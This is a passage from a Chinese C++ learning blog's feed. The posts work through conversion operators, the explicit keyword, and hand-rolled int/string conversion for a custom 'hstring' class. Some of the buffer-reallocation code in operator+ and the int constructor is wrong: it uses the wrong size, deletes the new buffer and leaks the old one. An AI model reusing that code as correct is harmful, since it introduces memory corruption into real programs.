class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Box</span>(<span class="type">int</span> _val)&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">operator</span> <span class="title">int</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="keyword">operator</span>+(Box b)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">Box b1&#123; <span class="number">100</span> &#125;, b2&#123; <span class="number">200</span> &#125;;</span><br><span class="line"><span class="type">int</span> x = b1 + <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/27/operatortype1/000.png" class=""><p>编译器给了报错<br>愿意在于，我们有两个重载，编译器就不能判断是把b1转成int还是把后面的100转成Box类型。<br>毕竟两种结果肯定不相同。</p><p>然后屏蔽的方法也就是说的关键字<code>explicit</code>。给其中一个做限制。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Box</span>(<span class="type">int</span> _val)&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">explicit</span> <span class="keyword">operator</span> <span class="title">int</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="keyword">operator</span>+(Box b)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/2022/06/27/operatortype1/001.png" class=""><p>做了隐转的限制之后，就能成功运行了，它会自动匹配到加法的重载。</p><p><strong>注意：explicit只是限制隐式转换，如果还是想要转换就直接强转就行了</strong></p><p>比如说：</p><img src="/2022/06/27/operatortype1/002.png" class=""><p>所以说<code>explicit</code>关键字重点就是限制类的operator重载时发生隐式转换。<br>至于放在哪个函数都无所谓，比如构造函数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">explicit</span> <span class="title">Box</span><span class="params">(<span class="type">int</span> _val)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">explicit</span> <span class="keyword">operator</span> <span class="title">int</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="keyword">operator</span>+(Box b)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">Box b1&#123; <span class="number">100</span> &#125;, b2&#123; <span class="number">200</span> &#125;;</span><br><span class="line"><span class="type">int</span> x = b1 + (Box)<span class="number">100</span>;</span><br><span class="line">std::cout &lt;&lt; x;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为构造函数无法隐转，所以当下面这种计算的时候，需要手动将100强转成Box类型。</p><hr><h2 id="修订hstring之前的问题再继续"><a href="#修订hstring之前的问题再继续" class="headerlink" title="修订hstring之前的问题再继续"></a>修订hstring之前的问题再继续</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hstring str;</span><br><span class="line">str = str + <span class="number">123</span>;</span><br></pre></td></tr></table></figure><img src="/2022/06/27/operatortype1/003.png" class=""><p>operator+重载是实现了，但是+完又赋值给str，就相当于<code>str += 123;</code><br>但是cmd能看到输出了23，说明不是完全的错误，可能是内存的问题。<br>就得回到operator+定义的地方看看。</p><p>在此之前，<code>hstring str;</code><br>是调用了构造函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">hstring</span>(<span class="type">char</span> ch = <span class="number">0x32</span>);</span><br><span class="line">hstring::<span class="built_in">hstring</span>(<span class="type">char</span> ch)&#123;</span><br><span class="line">    hsmLen = ch;                <span class="comment">//设置缓冲区</span></span><br><span class="line">    hsLen = <span class="number">0</span>;                    <span class="comment">//length = 0</span></span><br><span class="line">    c_str = <span class="keyword">new</span> <span class="type">char</span>[hsmLen];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个是没问题的，因为没有手动传值，他就用默认的设置缓冲区开辟一个。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">hstring &amp;hstring::<span class="keyword">operator</span>+(<span class="type">int</span> _val)&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">12</span>]&#123;&#125;;         <span class="comment">//根据int长度所设</span></span><br><span class="line">    <span class="type">int</span> len = <span class="number">11</span>;           <span class="comment">//考虑到符号位</span></span><br><span class="line">    <span class="type">bool</span> flag = _val &gt;= <span class="number">0</span>;  <span class="comment">//判断正负数</span></span><br><span class="line"></span><br><span class="line">    _val = _val * (flag * <span class="number">2</span> - <span class="number">1</span>);       <span class="comment">//是否取反</span></span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        str[--len] = _val % <span class="number">10</span> + <span class="number">48</span>;    <span class="comment">//int转char</span></span><br><span class="line">    &#125; <span class="keyword">while</span> (_val /= <span class="number">10</span>);</span><br><span class="line">    str[len = len - <span class="number">1</span> * (<span class="number">1</span> - flag)] = <span class="string">&#x27;-&#x27;</span> * (flag + <span class="number">1</span>) * (<span class="number">1</span> - flag) + str[len] * flag;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> hslen = hsLen + <span class="number">12</span> - len - <span class="number">1</span>;</span><br><span class="line">    hslen += hsLen - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (hslen &gt; hsmLen)&#123;</span><br><span class="line">        <span class="type">char</span> *rstr = c_str;</span><br><span class="line">        c_str = <span class="keyword">new</span> <span class="type">char</span>[len];      <span class="comment">//重新分配字符串空间</span></span><br><span class="line">        hsmLen = hslen;               <span class="comment">//重置缓冲区长度</span></span><br><span class="line">        <span class="built_in">memcpy</span>(c_str, rstr, hsLen);</span><br><span class="line">        <span class="keyword">delete</span>[] c_str;             <span class="comment">//清理内存</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(<span class="keyword">this</span>-&gt;c_str + hsLen - <span class="number">1</span>, str + len, <span class="number">12</span> - len);</span><br><span class="line">    hsLen = hslen;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们的hsLen一开始如果没有传值，他初始化就是0。<br><code>unsigned short hslen = hsLen + 12 - len - 1;</code><br>这段倒还好，0+12-len-1。<br><code>memcpy(this-&gt;c_str + hsLen - 1, str + len, 12 - len);</code><br>但是这里就出现问题了，我们的c_str初始化是0x32的长度，hsLen - 1 就是 0 - 1. 说明写入的时候就从c_str[-1]开始写。。。<br>这样一搞写到前面去了就崩了，不符合逻辑了。</p><p>所以要学类那样，即便是空的，也要给他一个字节区分开内存。<br>这里就是空的初始化时长度要为1。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hstring::<span class="built_in">hstring</span>(<span class="type">char</span> ch)&#123;</span><br><span class="line">    hsmLen = ch;                    <span class="comment">//设置缓冲区</span></span><br><span class="line">    hsLen = <span class="number">1</span>;                      <span class="comment">//length = 1</span></span><br><span class="line">    c_str = <span class="keyword">new</span> <span class="type">char</span>[hsmLen];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/27/operatortype1/004.png" class=""><p>这样就不会有事了。</p><p>但是相反，有传值构造的时候，就要先把长度重置了。</p><hr><p>然后是另一个加法问题</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hstring str;</span><br><span class="line">str = str + <span class="number">123</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> x = str + <span class="number">123</span>;</span><br><span class="line">std::cout &lt;&lt; str;</span><br></pre></td></tr></table></figure><p>这种情况，str一开始是”123”字符串了，那么当str+123的时候，它是选择将后者隐转，还是前者隐转。<br>毕竟两个值截然不同，一个“123123” 一个 123+123</p><p>当然这里肯定就一种情况，是我们之前写好的operator+</p><img src="/2022/06/27/operatortype1/005.png" class=""><p>所以还不够，我们要写一个构造函数，让int变成我们的hstring。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">hstring</span>(<span class="type">int</span> _val);</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">hstring::<span class="built_in">hstring</span>(<span class="type">int</span> _val):<span class="built_in">hstring</span>()&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">12</span>]&#123;&#125;;         <span class="comment">//根据int长度所设</span></span><br><span class="line">    <span class="type">int</span> len = <span class="number">11</span>;           <span class="comment">//考虑到符号位</span></span><br><span class="line">    <span class="type">bool</span> flag = _val &gt;= <span class="number">0</span>;  <span class="comment">//判断正负数</span></span><br><span class="line"></span><br><span class="line">    _val = _val * (flag * <span class="number">2</span> - <span class="number">1</span>);       <span class="comment">//是否取反</span></span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        str[--len] = _val % <span class="number">10</span> + <span class="number">48</span>;    <span class="comment">//int转char</span></span><br><span class="line">    &#125; <span class="keyword">while</span> (_val /= <span class="number">10</span>);</span><br><span class="line">    str[len = len - <span class="number">1</span> * (<span class="number">1</span> - flag)] = <span class="string">&#x27;-&#x27;</span> * (flag + <span class="number">1</span>) * (<span class="number">1</span> - flag) + str[len] * flag;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> hslen = hsLen + <span class="number">12</span> - len - <span class="number">1</span>;</span><br><span class="line">    hslen += hsLen - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (hslen &gt; hsmLen)&#123;</span><br><span class="line">        <span class="type">char</span> *rstr = c_str;</span><br><span class="line">        c_str = <span class="keyword">new</span> <span class="type">char</span>[len];      <span class="comment">//重新分配字符串空间</span></span><br><span class="line">        hsmLen = hslen;               <span class="comment">//重置缓冲区长度</span></span><br><span class="line">        <span class="built_in">memcpy</span>(c_str, rstr, hsLen);</span><br><span class="line">        <span class="keyword">delete</span>[] c_str;             <span class="comment">//清理内存</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(<span class="keyword">this</span>-&gt;c_str + hsLen - <span class="number">1</span>, str + len, <span class="number">12</span> - len);</span><br><span class="line">    hsLen = hslen;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//return *this;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从数字转char的写法就直接套之前operator的了。</p><img src="/2022/06/27/operatortype1/006.png" class=""><p>结果反正一样的。</p><p>构造函数完成了，就可以去触发之前说的隐转bug了。</p><blockquote><p>不过要先注释掉operator+的方法。</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hstring &amp;operator+(int _val);</span></span><br><span class="line"><span class="comment">//hstring &amp;operator+(unsigned _val);</span></span><br><span class="line"><span class="comment">//.cpp的定义自己注释不做演示。</span></span><br></pre></td></tr></table></figure><img src="/2022/06/27/operatortype1/007.png" class=""><p>注释完就能看到报错了，不过跟预期的有出入。</p><p>还要对右值进行一个操作，这里就是重载一次</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hstring &amp;<span class="keyword">operator</span>+(<span class="type">const</span> hstring &amp;&amp;str);</span><br><span class="line"></span><br><span class="line">hstring &amp;hstring::<span class="keyword">operator</span>+(<span class="type">const</span> hstring &amp;&amp;str)&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span> &lt;&lt; str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/27/operatortype1/008.png" class=""><p>改成这样差不多了。</p><blockquote><p>加右值引用是因为后面的常量内存是临时的，要想办法能够兼容。</p></blockquote><p>就是之前的问题，是前者隐转还是后者隐转。<br>不需要隐转的时候就在前面加关键字<br><code>explicit operator int();</code></p><img src="/2022/06/27/operatortype1/009.png" class=""><p>然后就出现了另一个问题。不存在从hstring转换到int的构造。</p><img src="/2022/06/27/operatortype1/010.png" class=""><p>单独拿出来相加可以，说明是相加之和得到了hstring类型的值。<br>那么就很简单。。强制转换一下。</p><img src="/2022/06/27/operatortype1/011.png" class=""><p>然后就然后行得通了。</p><hr><p>还有一些其它地方优化听的有点绕了，下次一定</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>总体上搞了一个半吊子不到的string</p><p>运算符重载还是要小心吧，毕竟你只是解决了一种情况，还有很多种情况还需要额外的重载。周而复始看着有点绕。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>重载类型转换</title>
      <link href="/2022/06/27/operatortype/"/>
      <url>/2022/06/27/operatortype/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><code>operator type() const</code><br>类型转换只能重载为类的成员函数<br>类型转换没有返回值，它的返回值由类型转换的类型来决定</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>昨天搞了字符串加数字合并成字符串</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hstring str&#123; <span class="string">&quot;123abc&quot;</span> &#125;;</span><br><span class="line">str + <span class="number">-321</span>;</span><br><span class="line">std::cout &lt;&lt; str;</span><br></pre></td></tr></table></figure><p>今天要逆转一下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x = (<span class="type">int</span>)str;</span><br></pre></td></tr></table></figure><p>类似于这种操作；</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">operator</span> <span class="title">int</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">hstring::<span class="keyword">operator</span> <span class="title">int</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看起来比较奇葩，而且虽然你没指定返回类型，但是编译的时候还是要你有一个返回值。</p><p>之前将数字转换成char类型通过ASCII码值去实现<br>就是字符0的十进制值为48<br>然后我们把数字+48转换成字符。</p><p>那么逆转之后，字符-48是否能为数字呢。</p><img src="/2022/06/27/operatortype/000.png" class=""><p>实践得真知~</p><p>这个原理没问题，但是要如何把这个数字转成长串，就是比如字符串<code>&quot;12345&quot;</code><br>你转换成数字，就是一万两千三百四十五。</p><p>总不能1 * 1000 + 2 * 1000 + 3 * 100 + 4 * 10 + 5<br>这其实有点操蛋。。。因为位数是不确定的，这种写法还要手动去规避，做傻瓜式操作。</p><p>但是数学的思维还是发散的。<br>换个角度，<br>1 * 10<br>+ 2<br>* 10<br>+ 3<br>* 10<br>+ 4<br>* 10<br>+ 5</p><p>这样的话循环是肯定可以实现的，具有一定的逻辑性。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> str[]&#123; <span class="string">&quot;123456&quot;</span> &#125;;</span><br><span class="line"><span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (str[i])&#123;</span><br><span class="line">    x = x * <span class="number">10</span> + str[i++] - <span class="number">48</span>;</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; x;</span><br></pre></td></tr></table></figure><img src="/2022/06/27/operatortype/001.png" class=""><p>ojbk，没啥问题。比之前那种*1000啥的就好很多。</p><p>不过这个只是解决了正数的问题，负数的情况下，这个就行不通了。</p><p>当然这种判断的可以用上次学的方法</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> str[]&#123; <span class="string">&quot;-123456&quot;</span> &#125;;</span><br><span class="line"><span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> i = (str[<span class="number">0</span>]==<span class="string">&#x27;-&#x27;</span>);</span><br><span class="line"><span class="keyword">while</span> (str[i])&#123;</span><br><span class="line">    x = x * <span class="number">10</span> + str[i++] - <span class="number">48</span>;</span><br><span class="line">&#125;</span><br><span class="line">x *= ((str[<span class="number">0</span>]!=<span class="string">&#x27;-&#x27;</span>) * <span class="number">2</span> - <span class="number">1</span>);</span><br><span class="line">std::cout &lt;&lt; x;</span><br></pre></td></tr></table></figure><p>也就是负数乘以 -1<br>正数乘以 1<br>关键就看那个布尔值*2-1。</p><img src="/2022/06/27/operatortype/002.png" class=""><hr><p>然后还是float的问题<br>浮点数有小数点，不过按照编译器原有的习惯，浮点数转int是不保留小数的，所以在if那边做手脚还是容易的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> str[]&#123; <span class="string">&quot;gsdahr&quot;</span> &#125;;</span><br><span class="line"><span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> i = (str[<span class="number">0</span>]==<span class="string">&#x27;-&#x27;</span>);</span><br><span class="line"><span class="keyword">while</span> (str[i] &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; str[i] &lt;= <span class="string">&#x27;9&#x27;</span>)&#123;</span><br><span class="line">    x = x * <span class="number">10</span> + str[i++] - <span class="number">48</span>;</span><br><span class="line">&#125;</span><br><span class="line">x *= ((str[<span class="number">0</span>]!=<span class="string">&#x27;-&#x27;</span>) * <span class="number">2</span> - <span class="number">1</span>);</span><br><span class="line">std::cout &lt;&lt; x;</span><br></pre></td></tr></table></figure><img src="/2022/06/27/operatortype/003.png" class=""><img src="/2022/06/27/operatortype/004.png" class=""><p>丢弃精度来的最容易，而且字符串里面非数字的话，就直接是0了，也规避了一些问题。</p><hr><p>合并到类里面。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">hstring::<span class="keyword">operator</span> <span class="title">int</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> i = (c_str[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>);</span><br><span class="line">    <span class="keyword">while</span> (c_str[i] &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; c_str[i] &lt;= <span class="string">&#x27;9&#x27;</span>)&#123;</span><br><span class="line">        x = x * <span class="number">10</span> + c_str[i++] - <span class="number">48</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    x *= ((c_str[<span class="number">0</span>] != <span class="string">&#x27;-&#x27;</span>) * <span class="number">2</span> - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>合并难度不大，就是要注意这个c_str是hstring的本质，也就是那个成员变量。</p><p>所以调用的时候都是类重载也是有这个原因的。</p><img src="/2022/06/27/operatortype/005.png" class=""><img src="/2022/06/27/operatortype/006.png" class=""><p>都没问题，就是注意不要溢出，因为样例用的都是以int类型做参考的，没用设置longlong那种长度</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>功能上bug还是有不少~~~慢慢再修吧</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>operator拓展</title>
      <link href="/2022/06/26/operator5/"/>
      <url>/2022/06/26/operator5/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>优化一下之前重载的时候 +<br>就是让hstring + 1234也能实现，不过要对后面的数进行转换，且在不使用三方函数。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>正常的一串数字<code>123456</code><br>跟char之间的联系，其实就要看ASCII码了。</p><img src="/2022/06/26/operator5/000.png" class=""><p>可以看到字符0的二进制数是48，其它都是在48基础上+<br>那么转换的思路就明确了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">12345</span>;</span><br><span class="line"><span class="type">char</span> str[<span class="number">12</span>]&#123;&#125;;     <span class="comment">//int 的范围，数了下大概长度10，然后算上符号。</span></span><br></pre></td></tr></table></figure><p>再然后肯定要通过循环，for和while其实都差不多，但是都有一个痛点</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (a!=<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    str[i] = (<span class="type">char</span>)(a % <span class="number">10</span> + <span class="number">48</span>);</span><br><span class="line">    i++;</span><br><span class="line">    a %= <span class="number">10</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一开始傻瓜式写法，都不知道自己怎么想的。。。。</p><ol><li>int i&#x3D;0;放在循环里面，每次都是从0开始覆盖，没有意义</li><li>不一定要强转，编译器有隐转</li><li>while的条件倒也惨白，里面a%&#x3D;10，如果最后一位是1，就死循环了。</li></ol><p>所以有的时候脑子真的晕乎乎，修改一下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (a)&#123;</span><br><span class="line">    str[i++] = (<span class="type">char</span>)(a % <span class="number">10</span> + <span class="number">48</span>);</span><br><span class="line">    a /= <span class="number">10</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就行了。强转之类的不是必要的问题不大啊。</p><img src="/2022/06/26/operator5/001.png" class=""><hr><p>负数的问题<br>无非就是前面多个<code>-</code>号<br>而且我们这里本身最后还要倒转，所以在循环结束的时候判断一下是否小于0，</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (a &lt; <span class="number">0</span>) str[i++] = <span class="string">&#x27;-&#x27;</span>;</span><br></pre></td></tr></table></figure><p>加上这个就完事。</p><p>但是运行的时候就会发现毛病。因为负数，取模运算就搞事情了，+48也得不到那个字符。<br>所以要先给他反转。</p><p>然后 a&lt;0这个预计要用两次，而且第二次的时候a已经反转成正数了。</p><p>所以可能要提前放在一个布尔变量里。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">-12345</span>;</span><br><span class="line"><span class="type">char</span> str[<span class="number">12</span>]&#123;&#125;;</span><br><span class="line"><span class="type">bool</span> flag = a &lt; <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (flag) a = -a;</span><br><span class="line"><span class="keyword">while</span> (a)&#123;</span><br><span class="line">    </span><br><span class="line">    str[i++] = a % <span class="number">10</span> + <span class="number">48</span>;</span><br><span class="line">    a /= <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(flag) str[i++] = <span class="string">&#x27;-&#x27;</span>;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; str;</span><br></pre></td></tr></table></figure><img src="/2022/06/26/operator5/002.png" class=""><p>跑了一遍也没啥问题，ok。</p><hr><p>然后反转一下。</p><p>也需要额外定义一个变量。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">-12345</span>;</span><br><span class="line"><span class="type">char</span> str[<span class="number">12</span>]&#123;&#125;;</span><br><span class="line"><span class="type">char</span> strA[<span class="number">12</span>]&#123;&#125;;</span><br><span class="line"><span class="type">bool</span> flag = a &lt; <span class="number">0</span>;</span><br><span 